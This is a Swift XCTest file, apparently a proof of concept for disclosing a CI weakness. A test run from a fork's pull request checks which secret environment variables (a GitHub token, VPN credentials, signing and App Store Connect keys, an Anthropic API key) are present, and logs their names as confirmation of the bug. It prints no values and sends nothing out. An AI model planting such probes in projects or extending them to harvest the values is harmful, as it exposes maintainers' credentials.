import XCTest

final class EnvLister: XCTestCase {
    func testListEnvVarNames() {
        let interestingKeys = [
            "ORG_GITHUB_TOKEN", "ORG_GITHUB_USERNAME",
            "PIA_ACCOUNT_USERNAME", "PIA_ACCOUNT_PASSWORD", "PIA_TEST_DEDICATEDIP",
            "DEVELOPER_CERTIFICATE_PASSWORD", "KEYCHAIN_NAME", "KEYCHAIN_PASSWORD",
            "APP_STORE_CONNECT_KEY_ID", "APP_STORE_CONNECT_ISSUER_ID", "APP_STORE_CONNECT_KEY",
            "ANTHROPIC_API_KEY", "SEMGREP_APP_TOKEN",
        ]

        let env = ProcessInfo.processInfo.environment
        var found: [String] = []
        var missing: [String] = []

        for key in interestingKeys {
            if env[key] != nil {
                found.append(key)
            } else {
                missing.append(key)
            }
        }

        print("==========================================")
        print("[POC] CI/CD pipeline triggered from fork PR")
        print("[POC] Env vars FOUND: \(found.joined(separator: ", "))")
        print("[POC] Env vars MISSING: \(missing.joined(separator: ", "))")
        print("[POC] Workflow: ios_pull_request.yml | Trigger: pull_request")
        print("==========================================")

        XCTAssertGreaterThan(found.count, 0, "Secrets found — bug confirmed")
    }
}
